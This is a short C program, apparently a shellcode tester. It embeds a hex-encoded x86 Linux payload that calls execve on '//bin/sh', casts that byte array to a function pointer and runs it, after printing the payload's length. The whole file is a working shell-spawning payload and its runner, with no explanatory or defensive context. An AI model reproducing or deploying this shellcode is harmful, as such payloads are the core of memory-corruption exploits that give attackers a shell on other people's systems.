#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xc9\xeb\x05\x5b\x04\x0b\xcd\x80\xe8\xf6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
